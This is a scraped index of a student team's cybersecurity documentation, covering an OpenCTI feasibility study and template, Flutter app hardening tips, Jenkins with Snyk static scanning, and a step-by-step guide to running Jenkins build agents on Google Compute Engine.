university’s VM infrastructure, ensuring all users are comfortable with this environment.  ","version":"Next","tagName":"h3"},{"title":"COST-BENEFIT ANALYSIS​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#cost-benefit-analysis","content":" Initial Costs: The cost analysis will reflect savings from not requiring new on-premises hardware or cloud services. Instead, the focus will be on any costs associated with configuring and optimizing the existing VMs for OpenCTI.Ongoing Costs: Recurring costs might include additional VM resources if needed, but there will be no expenses related to maintaining physical hardware or cloud subscriptions.Benefits Analysis: The benefits will include leveraging existing infrastructure to minimize costs, while still gaining enhanced threat intelligence capabilities through OpenCTI. This approach could also improve ROI by avoiding the need for significant new investments in hardware or cloud services.  ","version":"Next","tagName":"h3"},{"title":"RISK ASSESSMENT​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#risk-assessment","content":" Technical Risks: Risks will center on the limitations of the existing VM environment, such as performance constraints, resource availability, and potential integration challenges. Mitigation strategies will focus on optimizing the VM environment for OpenCTI.Organizational Risks: Organizational readiness will include ensuring that all participants are comfortable working within the VM environment and that the necessary resources (both technical and human) are available to support OpenCTI in this context.Mitigation Strategies: Strategies will include ensuring sufficient VM resources are allocated, providing specialized training for managing OpenCTI within VMs, and working closely with the university’s IT team to address any infrastructure limitations.  ","version":"Next","tagName":"h2"},{"title":"ALTERNATIVE SOLUTIONS​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#alternative-solutions","content":" Evaluation of Alternatives:  MISP (Malware Information Sharing Platform): MISP is an open-source platform like OpenCTI and should be evaluated for how well it can be integrated within the existing VM infrastructure. Given its flexibility, MISP could be a viable option if it aligns well with the current environment.ThreatConnect: A commercial platform with advanced features, ThreatConnect should be assessed for its compatibility with the VM environment. Consider whether it is more complex feature set justifies the cost and effort needed to deploy it in the existing infrastructure.Anomali: Another commercial solution, Anomali’s suitability for deployment in the VM infrastructure must be considered. Its robust capabilities may offer significant advantages, but at a higher cost and potential complexity.  Comparison  Features: The feature comparison remains unchanged, focusing on the capabilities of each platform.Cost: Acknowledge that the costs related to deploying these alternatives should now also factor in any challenges or benefits associated with the VM infrastructure.Suitability: Consider how well each alternative can be integrated into the VM environment, like the evaluation for OpenCTI.  ","version":"Next","tagName":"h2"},{"title":"CONCLUSION​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#conclusion","content":" Summary of Findings: The conclusion will reflect the suitability of OpenCTI for deployment within the existing VM environment. Emphasize that this approach maximizes the use of current resources while still providing the desired enhancements to threat intelligence capabilities.Recommendations: Recommend moving forward with OpenCTI, with an implementation plan that includes careful testing and optimization within the VM environment.Next Steps: The next steps will include working with the university’s IT team to ensure the VMs are properly configured for OpenCTI and planning for a pilot phase to test the deployment in this environment. ","version":"Next","tagName":"h2"},{"title":"Feasibility Study on Implementing OpenCTI Template","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#1-introduction","content":" Purpose of the StudyBackground Information on OpenCTI  ","version":"Next","tagName":"h2"},{"title":"2. Objectives​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#2-objectives","content":" Define the specific goals and objectives of implementing OpenCTI within the organization.  ","version":"Next","tagName":"h2"},{"title":"3. Functional Analysis​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#3-functional-analysis","content":" Overview of OpenCTI's features and functionalities.Comparison with organizational requirements and objectives.Identification of key features that align with organizational needs.  ","version":"Next","tagName":"h2"},{"title":"4. Technical Assessment​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#4-technical-assessment","content":" System Requirements: Hardware, software, and network infrastructure needed to deploy OpenCTI.Compatibility: Evaluation of compatibility with existing systems, tools, and protocols.Scalability: Assessment of OpenCTI's ability to scale with organizational growth and data volume.Deployment Considerations: Analysis of deployment options (on-premises, cloud-based) and associated technical challenges.Maintenance and Support: Evaluation of ongoing maintenance requirements and availability of technical support resources.  ","version":"Next","tagName":"h2"},{"title":"5. Security and Compliance​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#5-security-and-compliance","content":" Security Features: Overview of OpenCTI's security measures to protect data confidentiality, integrity, and availability.Compliance: Assessment of OpenCTI's compliance with relevant regulations and standards (e.g., GDPR, NIST).Data Privacy: Examination of how OpenCTI handles sensitive information and ensures privacy compliance.  ","version":"Next","tagName":"h2"},{"title":"6. Integration Potential​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#6-integration-potential","content":" Compatibility with Existing Tools: Evaluation of OpenCTI's ability to integrate with other security tools, such as SIEM, threat intelligence feeds, etc.API Capabilities: Analysis of OpenCTI's API functionalities for custom integrations with internal systems.Interoperability: Assessment of interoperability with industry-standard formats and protocols.  ","version":"Next","tagName":"h2"},{"title":"7. User Experience and Training​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#7-user-experience-and-training","content":" Usability: Evaluation of OpenCTI's user interface and user experience for security analysts and administrators.Training Requirements: Identification of training needs for staff to effectively utilize OpenCTI.Support Resources: Availability of documentation, tutorials, and user communities for assistance.  ","version":"Next","tagName":"h2"},{"title":"8. Cost-Benefit Analysis​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#8-cost-benefit-analysis","content":" Initial Costs: Estimation of initial setup costs including licensing fees, hardware/software procurement, and implementation expenses.Ongoing Costs: Assessment of recurring costs such as subscription fees, maintenance, and support.Benefits Analysis: Identification and quantification of potential benefits, such as improved threat visibility, faster incident response, and risk reduction.Return on Investment (ROI): Calculation of the ROI based on cost savings and risk mitigation benefits over a specified time.  ","version":"Next","tagName":"h2"},{"title":"9. Risk Assessment​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#9-risk-assessment","content":" Technical Risks: Identification of potential technical challenges and risks associated with implementing OpenCTI.Organizational Risks: Assessment of organizational readiness, change management challenges, and stakeholder buy-in.Mitigation Strategies: Development of strategies to mitigate identified risks and challenges.  ","version":"Next","tagName":"h2"},{"title":"10. Alternative Solutions​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#10-alternative-solutions","content":" Evaluation of alternative solutions to OpenCTI, including other open-source and commercial threat intelligence platforms.Comparison of features, costs, and suitability to organizational requirements.  ","version":"Next","tagName":"h2"},{"title":"11. Conclusion​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI Template","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study on OpenCTI Template#11-conclusion","content":" Summary of findings and recommendations regarding the feasibility of implementing OpenCTI. Next Steps: Proposed actions for moving forward, including a timeline and implementation plan.  This outline provides a structured approach to conducting a feasibility study on implementing OpenCTI within an organization. Each section can be further elaborated with detailed analysis and findings based on the specific context and requirements of the organization. ","version":"Next","tagName":"h2"},{"title":"Security for Flutter Applications","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/flutter-security","content":"","keywords":"","version":"Next"},{"title":"Code Obfuscation​","type":1,"pageTitle":"Security for Flutter Applications","url":"/redback-documentation/docs/cybersecurity/research/flutter-security#code-obfuscation","content":" Code obfuscation happens when you alter the app’s binary using encryption. Code Obfuscation hides sensitive information shown in the code and means the attacker cannot reverse engineer the mobile application. If the attacker is able to reverse engineer redback operations mobile apps, the attacker can see sensitive information such as API keys, classes, function names, and all strings values [1]. Code Obfuscation can be used on Android, iOS, and MacOS and to secure flutter mobile apps using obfuscation. Implementing code obfuscation can be found within Flutter documentation [2].  ","version":"Next","tagName":"h2"},{"title":"Rooting or Jailbreaking protection​","type":1,"pageTitle":"Security for Flutter Applications","url":"/redback-documentation/docs/cybersecurity/research/flutter-security#rooting-or-jailbreaking-protection","content":" Rooting android devices and jailbreaking or iOS devices is a serious security issue mobile developers must be aware of and must detect this issue to act accordingly. Rooting and jailbreaking devices will allow the attacker to implement malware in the application to export client’s critical data [1]. An extensive guide on how to implement rooting and jailbreaking protection in mobile development applications can be followed here: https://pub.dev/packages/flutter_jailbreak_detection. This guide also states that there is a plugin called RootBeer that detects vulnerable mobile applications that can be rooted by attacker. In addition, another plugin called DTTJailbreakDetection is used to check whether iOS devices can be jail broken.  ","version":"Next","tagName":"h2"},{"title":"How to Secure flutter application code:​","type":1,"pageTitle":"Security for Flutter Applications","url":"/redback-documentation/docs/cybersecurity/research/flutter-security#how-to-secure-flutter-application-code","content":" We also want to restrict network traffic to make sure redback operations domain is not communicating with any other domains. From the GitHub links provided by redback operation I can see the developers have not implemented ways to restrict network traffic for iOS and android. Therefore, I recommend following https://www.codeplayon.com/2021/12/how-to-secure-flutter-application-code/ . This will make the flutter applications secure and restrict malicious activity on the network. I will also highly recommend using SSL or TLS encryption, this will protect data transferred between the mobile application and the relevant server [1].  ","version":"Next","tagName":"h2"},{"title":"Note​","type":1,"pageTitle":"Security for Flutter Applications","url":"/redback-documentation/docs/cybersecurity/research/flutter-security#note","content":" Please note, that I will create a presentation to elaborate further, and I will recommend further changes. This document is to show the mobile developers of Redback Operations on how to implement critical security measures in flutter applications.  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Security for Flutter Applications","url":"/redback-documentation/docs/cybersecurity/research/flutter-security#references","content":" [1] AB. Satyaprakash (2022, February, 2). 5 steps to secure your next Flutter app [Website]. Available: https://medium.com/nerd-for-tech/5-steps-to-secure-your-next-flutter-app-549def2428b3  [2] Flutter (n.d). Obfuscating Dart code [Website]. Available: https://docs.flutter.dev/deployment/obfuscate  [3] appmire.be (n.d). flutter_jailbreak_detection 1.8.0 [Website]. Available: flutter_jailbreak_detection: https://pub.dev/packages/flutter_jailbreak_detection  [4] Codeplayon (2021, December. 2). How to secure flutter application code [Website]. Available: https://www.codeplayon.com/2021/12/how-to-secure-flutter-application-code/ ","version":"Next","tagName":"h2"},{"title":"Jenkins and Snyk – a SAST plugin","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/jenkins-and-snyk","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Jenkins and Snyk – a SAST plugin","url":"/redback-documentation/docs/cybersecurity/research/jenkins-and-snyk#introduction","content":" Jenkins: Jenkins is a Continuous Integration (CI) or Continuous Delivery (CD) tool, which provides many plugins to support it. Jenkins builds and tests software projects continuously to make it easier for developers to integrate changes to the project, and make it easier for users to obtain a fresh build [3]. To do the Continuous Delivery, a substantial number of testing and deployment plugins are available in Jenkins [3]. Besides, Jenkins can install Google Compute Engine (GCE) plugin to communicate with GCP. Snyk: Snyk is an open-source SAST tool. It can scan source code and identify vulnerabilities behind it. It supports JAVA, JAVASCRIPT, PYTHON and so on [4]. It also provides integration plugins to facilitate vulnerability scans while building projects. It has an open-source version and an enterprise-paid version. In this project, we just use its open-source version [1].  ","version":"Next","tagName":"h2"},{"title":"How does Jenkins work?​","type":1,"pageTitle":"Jenkins and Snyk – a SAST plugin","url":"/redback-documentation/docs/cybersecurity/research/jenkins-and-snyk#how-does-jenkins-work","content":" https://www.jenkins.io/doc/book/installing/linux/  ","version":"Next","tagName":"h2"},{"title":"How does Snyk work?​","type":1,"pageTitle":"Jenkins and Snyk – a SAST plugin","url":"/redback-documentation/docs/cybersecurity/research/jenkins-and-snyk#how-does-snyk-work","content":" First, install the Snyk Security plugin by clicking “Manage Jenkins” on the dashboard, then ”Manage Plugins”-&gt; ”Available”. Search “Snyk Security Plugin” and then install it. After installation, go to “Dashboard” -&gt; “Manage jenkins” -&gt; “Global Tool Configuration” to add a Snyk installation.  Second, get our Snyk API Token. To achieve this, we first register an account in snyk.io website, then visit https://app.snyk.io/account page, and copy the auth token in the “Key” input field.  Third, configure the Snyk Security plugin in the Jenkins surface as below [2]:  • Go to &quot;Manage Jenkins&quot; &gt; &quot;Manage Credentials&quot; • Choose a Store • Choose a Domain • Go to &quot;Add Credentials&quot; • Select &quot;Snyk API Token&quot; • Configure the Credentials • Casually input an &quot;ID&quot; but remember because it is needed when configuring the build step. • Go to &quot;Manage Jenkins&quot; &gt; &quot;Configure System&quot;-&gt;”Global properties”, check “Environment variables”, and then add two environment variables as below:  \tname\tvalues SYNK_API\thttps://snyk.io/api/v1 SYNK_TOKEN\t&lt;Snyk API Token&gt;*  * its value varies from different Snyk accounts.  Fourth, configure building a project as below [2]:  Select a projectGo to &quot;Configure&quot;Under &quot;Build Steps&quot;, select &quot;Add build step&quot; then select &quot;Invoke Snyk Security Task&quot; and configure as needed. Here we only configure Snyk API token field and Snyk installation field.Under &quot; Source Code Management&quot;, select &quot;Git&quot; then fill in “Repository URL” field as whichever our company’s valid git address is(e.g., https://github.com/redbackoperations/website-frontend). Fill in other fields as needed  ","version":"Next","tagName":"h2"},{"title":"Review of Snyk​","type":1,"pageTitle":"Jenkins and Snyk – a SAST plugin","url":"/redback-documentation/docs/cybersecurity/research/jenkins-and-snyk#review-of-snyk","content":" Snyk is a professional SAST tool. It analyses and tests the static code and gives reports showing a detailed analysis of the code and a list of all bugs. More importantly, its open-source version is enough for our team to use. Another famous SAST tool is called Checkmarx, which also has its Jenkins integration plugin. After the plugin installs, and before compilation begins, source code analysis of Checkmarx can be executed to identify security vulnerabilities. However, this tool is commercial and has to be paid for. Therefore, from the price point of view, this software is also more suitable.  By using Snyk to analyse and test the source code of website-frontend of redbackoperations, a vulnerability report is generated. The report says that there are 2 high-risk vulnerabilities and 4 medium-risk vulnerabilities in this project. One vulnerability is detailed as below:      ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Jenkins and Snyk – a SAST plugin","url":"/redback-documentation/docs/cybersecurity/research/jenkins-and-snyk#conclusion","content":" The Jenkins integrated with Snyk is very convenient for developers to discover security flaws before building and submitting their projects to their production environment. Snyk can give a detailed report, which gives users an insight into the security of their project. Therefore, it is recommendable for this solution to be used in our development of projects in our company.  Reference List  [1] A. Agarwal, “DevSecOps: Static Application Security Testing Sast using SNYK in Jenkins,” Medium, 10-Feb-2021. [Online]. Available: https://toashishagarwal.medium.com/devsecops-static-application-security-testing-sast-using-snyk-in-jenkins-57ce3d992945. [Accessed: 21-Nov-2022].  [2] Jenkinsci, “Jenkinsci/SNYK-security-scanner-plugin: Test and monitor your projects for vulnerabilities with Jenkins. this plugin is officially maintained by Snyk.,” GitHub. [Online]. Available: https://github.com/jenkinsci/snyk-security-scanner-plugin. [Accessed: 21-Nov-2022].  [3] Saurabh, “What is Jenkins?: Jenkins for continuous integration,” Edureka, 15-Nov-2022. [Online]. Available: https://www.edureka.co/blog/what-is-jenkins/. [Accessed: 22-Nov-2022].  [4] “SNYK code - supported languages and Frameworks,” Snyk Code - Supported languages and frameworks - Snyk User Docs. [Online]. Available: https://docs.snyk.io/products/snyk-code/snyk-code-language-and-framework-support. [Accessed: 22-Nov-2022]. ","version":"Next","tagName":"h2"},{"title":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine","content":"","keywords":"","version":"Next"},{"title":"Abstract​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#abstract","content":" The document aims to illustrate how to create an IAM service account on google cloud console, how to create a reusable Compute Engine image, how to install and configure Google Cloud Engine(GCE) plugin, and how to run a job(e.g., building a Redback frontend project) on an a Jenkins agent created automatically on google cloud.  ","version":"Next","tagName":"h2"},{"title":"Terminology:​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#terminology","content":" an IAM service account is “a special kind of account used by an application or compute workload, such as a Compute Engine virtual machine (VM) instance, rather than a person” [1]. This account will be used to create a private key for Jenkins to access google cloud.  The Google Compute Engine (GCE) Plugin allows developers to use GCE virtual machines (VMs) with Jenkins to execute build tasks. GCE VMs provision quickly, are destroyed by Jenkins when idle, and therefore the VMs run at a much lower price than regular VMs [2].  Jenkins is an automation tool that helps in automating the various parts of the Software Development Life Cycle(SDLC) process [3]. The Google Compute Engine (GCE) Plugin is one of the numerous plugins Jenkins provide.  Packer is an open source tool for creating machine images. Here Packer is used to build a reusable Compute Engine image that contains the software and tools needed to run as a Jenkins executor [4].  ","version":"Next","tagName":"h2"},{"title":"Steps:​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#steps","content":" ","version":"Next","tagName":"h2"},{"title":"1. Create and configure an IAM service account​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#1-create-and-configure-an-iam-service-account","content":" to create an IAM service account on the dashboard of google cloud, click “Activate Cloud Shell” on the top-right corner      set project sit-22t2-redback-infra-612f89e input the following commands and enter: gcloud iam service-accounts create jenkins --display-name jenkins export SA_EMAIL=$(gcloud iam service-accounts list \\ --filter=&quot;displayName:jenkins&quot; --format='value(email)') export PROJECT=$(gcloud info --format='value(config.project)') Bind the following roles to your service account. Remember that a ordinary account does not have such permissions to grant those roles to the account “jenkins”. Therefore, please ask the admin account owner(i.e., “scott.blackburn@deakin.edu.au”) to help execute those permissions: gcloud projects add-iam-policy-binding $PROJECT \\ --role roles/storage.admin --member serviceAccount:$SA_EMAIL gcloud projects add-iam-policy-binding $PROJECT --role roles/compute.instanceAdmin.v1 \\ --member serviceAccount:$SA_EMAIL gcloud projects add-iam-policy-binding $PROJECT --role roles/compute.networkAdmin \\ --member serviceAccount:$SA_EMAIL gcloud projects add-iam-policy-binding $PROJECT --role roles/compute.securityAdmin \\ --member serviceAccount:$SA_EMAIL gcloud projects add-iam-policy-binding $PROJECT --role roles/iam.serviceAccountActor \\ --member serviceAccount:$SA_EMAIL   After successfully execute the above commands, execute the following command to create a private key used for Jenkins to get access to google cloud compute engine in the later steps:  gcloud iam service-accounts keys create jenkins-sa.json --iam-account $SA_EMAIL  In Cloud Shell, click “More”, and then click Download file. Type jenkins-sa.json. Click Download to save the file locally.  ","version":"Next","tagName":"h3"},{"title":"2. Create a Jenkins agent image on google cloud console​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#2-create-a-jenkins-agent-image-on-google-cloud-console","content":" create a SSH key pair on google console. If one already exists, this command uses that key pair; otherwise, it creates a new one:  ls ~/.ssh/id_rsa.pub || ssh-keygen -N &quot;&quot;  Add the Cloud Shell public SSH key to your project's metadata:   --format=json | jq -r '.commonInstanceMetadata.items[] | select(.key == &quot;ssh-keys&quot;) | .value' &gt; sshKeys.pub echo &quot;$USER:$(cat ~/.ssh/id_rsa.pub)&quot; &gt;&gt; sshKeys.pub gcloud compute project-info add-metadata --metadata-from-file ssh-keys=sshKeys.pub   download Packer software:  unzip packer_1.7.10_linux_amd64.zip   Create the configuration file for your Packer image builds:  cat &gt; jenkins-agent.json &lt;&lt;EOF { &quot;builders&quot;: [ { &quot;type&quot;: &quot;googlecompute&quot;, &quot;project_id&quot;: &quot;$PROJECT&quot;, &quot;source_image_family&quot;: &quot;ubuntu-2004-lts&quot;, &quot;source_image_project_id&quot;: &quot;ubuntu-os-cloud&quot;, &quot;zone&quot;: &quot;us-central1-a&quot;, &quot;disk_size&quot;: &quot;50&quot;, &quot;image_name&quot;: &quot;jenkins-agent-{{timestamp}}&quot;, &quot;image_family&quot;: &quot;jenkins-agent&quot;, &quot;ssh_username&quot;: &quot;ubuntu&quot; } ], &quot;provisioners&quot;: [ { &quot;type&quot;: &quot;shell&quot;, &quot;inline&quot;: [&quot;sudo apt-get update &amp;&amp; sudo apt-get install -y default-jdk&quot;] } ] } EOF   Build the image by running Packer:  ./packer build jenkins-agent.json  If the following prompt appears, it means the image is built successfully:  --&gt; googlecompute: A disk image was created:   ","version":"Next","tagName":"h3"},{"title":"3. Onstall Google Cloud Engine(GCE) plugin​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#3-onstall-google-cloud-enginegce-plugin","content":" ****In this section, we can use Cloud Marketplace to provision a Jenkins instance [4], or we can use our locally installed Jenkins. Here we use the locally installed Jenkins. However, for productional use, I recommend using a custom Jenkins instance VM provisioned by Cloud Marketplace, which costs some money.  To install Google Cloud Engine(GCE) plugin. First, we log on the Jenkins admin website. Then, in the Jenkins dashboard UI, select “Manage Jenkins” -&gt; ”Manage Plugins”, Click the Available tab and use the Filter bar to find the following plugins and select the boxes next to them:  Compute Engine plugin      Click “Download now and install after restart” and then click the Restart Jenkins when installation is complete and no jobs are running checkbox [4]. Jenkins will restarts and completes the plugin installations [4].  ","version":"Next","tagName":"h3"},{"title":"4. Create plugin credentials​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#4-create-plugin-credentials","content":" Log in to Jenkins again, and click Manage Jenkins -&gt; Manage Credentials -&gt; (global) -&gt; “add credentials”:  Set Kind to Google Service Account from private key.In the Project Name field, enter Google Cloud project ID(i.e., sit-22t2-redback-infra-612f89e).Click Choose file.Select the jenkins-sa.json file which was previously downloaded from Cloud console Shell.Click OK.  ","version":"Next","tagName":"h3"},{"title":"5. Configure Google Cloud Engine(GCE) plugin​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#5-configure-google-cloud-enginegce-plugin","content":" Click Manage Jenkins -&gt; Manage Nodes and Clouds -&gt; Configure CloudsClick Add a new Cloud, then click Google Compute Engine.Set the following settings and replace [YOUR_PROJECT_ID] with your Google Cloud project ID:  Name: [YOUR_PROJECT_ID] Project ID: [YOUR_PROJECT_ID] Instance Cap: 8   Choose the service account from the Service Account Credentials drop-down list. It is listed as your Google Cloud project ID [4].click Add under Instance Configurations.Enter the following General settings: Name-prefix: gceDescription: Ubuntu agentLabels: ubuntu-2004 Enter the following for Location settings: Region: australia-southeast1Zone: australia-southeast1-b Click Advanced.For Machine Configuration, choose the Machine Type of n1-standard-1.Under Networking, choose the following settings: Network: Leave at default setting.Subnetwork: Leave at default setting.Select Attach External IP?. Select the following for Boot Disk settings: For Image project, choose your Google Cloud project.For Image name, select the image you built earlier using Packer. Click Save to persist your configuration changes.  ","version":"Next","tagName":"h3"},{"title":"6. Configure and run a project​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#6-configure-and-run-a-project","content":" Click + New Item in the Jenkins interface to create a new job.Enter GCPtest as the item name.Click Freestyle project, and then click OK.Check the Execute concurrent builds if necessary and Restrict where this project can run boxes.In the Label Expression field, enter ubuntu-2004.In the Build Steps section, click Add build step.Click Execute Shell.In the command box, enter a test string:echo &quot;hostname:`hostname`&quot;Click Save.Click Build Now to start a build.  If successful, the Console output should look like this below:      ","version":"Next","tagName":"h3"},{"title":"7. Troubleshoot​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#7-troubleshoot","content":" If building a project fails, and the prompt is like that:      To troubleshoot, click “Manage Jenkins”-&gt;”System Log” to find relevant error logs. Here list one error log and its corresponding solution:  error log:       solution: go to “Manage nodes and clouds”-&gt;”Configure Clouds”-&gt;”Advanced…”, select default on the droplist of Network, and default on the droplist of Subnetwork.   ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Build a project on google compute engine VM by using Jenkins Google Compute Engine Plugin instruction manual","url":"/redback-documentation/docs/cybersecurity/research/google-compute-engine#references","content":" [1] “Service accounts | IAM documentation | google cloud,” Google. [Online]. Available: https://cloud.google.com/iam/docs/service-accounts. [Accessed: 11-Dec-2022].  [2] Google Compute engine. [Online]. Available: https://plugins.jenkins.io/google-compute-engine/. [Accessed: 11-Dec-2022].  [3] Jagrat, “Jenkins build jobs - how to create and trigger build jobs in Jenkins?,” TOOLSQA, 11-Dec-2022. [Online]. Available: https://www.toolsqa.com/jenkins/jenkins-build-jobs/. [Accessed: 11-Dec-2022].  [4] “Using Jenkins for distributed builds on Compute engine | cloud architecture center | google cloud,” Google. [Online]. Available: https://cloud.google.com/architecture/using-jenkins-for-distributed-builds-on-compute-engine. [Accessed: 11-Dec-2022]. ","version":"Next","tagName":"h3"},{"title":"Jenkins Automation Security","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#introduction","content":" Jenkins is a free and open-source automation tool that has built-in plugins for use with continuous integration. Your project is built, compiled, and tested using it, making it simple for developers to make modifications to the project. A tool for automation, Jenkins is an expansive server that enables any developers to create, test, and release software. It utilises Java because it was created in Java. Jenkins enables end-to-end automation of projects (jobs) or other types of initiatives. No matter what platform you are using, Jenkins is a potent tool that enables continuous integration and delivery of projects. Any build or continuous integration can be handled by this free source. A variety of testing and deployment solutions are compatible with Jenkins. Your software projects will be regularly built and tested using Jenkins.  ","version":"Next","tagName":"h2"},{"title":"How does Jenkins automation work?​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#how-does-jenkins-automation-work","content":" Jenkins is software that enables continuous integration. Developers are required to recurrently incorporate new code into a shared repository in accordance with the continuous integration development methodology. Because of the increase in release frequency, manual deployment of all these releases is now extremely time-consuming, underscoring the urgent need for automated deployment. This concept was created to address the problem of identifying errors later in the build process. Deploying an application or component to test servers and then to end users enables it to be available for testing, making it a crucial phase in the software development life cycle (by deploying on the production server).      Jenkins can automate these routine deployments using predetermined triggers and conditions. We can fully or partially ship the code across multiple development stages, from fundamental development through production, using a method called automatic deployment. When our deployments are automated, they are more dependable and effective. This functionality is automated to the greatest extent possible to prevent flawed functionality during the transition of code from development to production. The quantity of testing conducted prior to release has an impact on the dependability and stability of an application. Automated testing and cloud-native technologies have made it possible for testing to grow faster and more thorough over the past few decades.  ","version":"Next","tagName":"h2"},{"title":"Advantages and Disadvantages of Jenkins automation​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#advantages-and-disadvantages-of-jenkins-automation","content":" ","version":"Next","tagName":"h2"},{"title":"Advantages​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#advantages","content":" Constant delivery is made simpler with Jenkins because updates to software are automatically tested and released as soon as they meet all requirements. This lessens the need for human interaction and the likelihood of human error. Focused on developers. Because Jenkins was made by and for developers, it provides the capabilities that developers would require and would expect to work. Developers utilising Jenkins can thus concentrate on actualizing their innovations rather than laborious, repeated testing procedures. Reports. Users can get a detailed understanding of the automated tests and how successfully they were carried out through the display of test results summary and trends. The patterns of the automated tests, including prior versions' failure points, the duration of various tests, etc., are visible to testers. Such knowledge greatly aids users in enhancing the pipeline. Jenkins does not require developers' access to be restricted for test automation purposes, therefore testing is not intrusive. Jenkins will handle the rest while QA teams can specify what they want to automate. Small modifications are simple to handle; the smaller the modification, the less eager a developer is to wait for a build. Tests required for a minor change can be done automatically in a matter of seconds. Jenkins' scheduling functionality enables testers to schedule tests to run at predetermined times. This is a quicker and more practical method.  ","version":"Next","tagName":"h3"},{"title":"Disadvantages​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#disadvantages","content":" Jenkins is free software that receives a lot of contributions. Because of the various plugins that have been created for a single tool, consumers may find their options confusing. Plugins have less versatility because they can't be customised. The plugins offered in Jenkins do not allow much modification or customization to make them more unique because most of them do not have enough documentation to assist the users. Jenkins has a challenging configuration process that requires significant learning. Jenkins has a lot of features and options that must be examined, so getting a handle on it takes some time. A cloud-based service is not itself hosted by Jenkins. Jenkins, which is offered as a service by cloud service providers like Azure, Cloudbees, etc., must be used by users. As well Jenkins's Docker integration needs to be improved. Rules and options for authentication and permission are lacking.  ","version":"Next","tagName":"h3"},{"title":"Jenkins Plugins​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#jenkins-plugins","content":" Jenkins plugin is a package in java-archive format that adheres to a predetermined structure while being developed. Each plugin includes all the necessary data, including files, graphics, code, and other details. Jenkins essentially describes the collection of interfaces 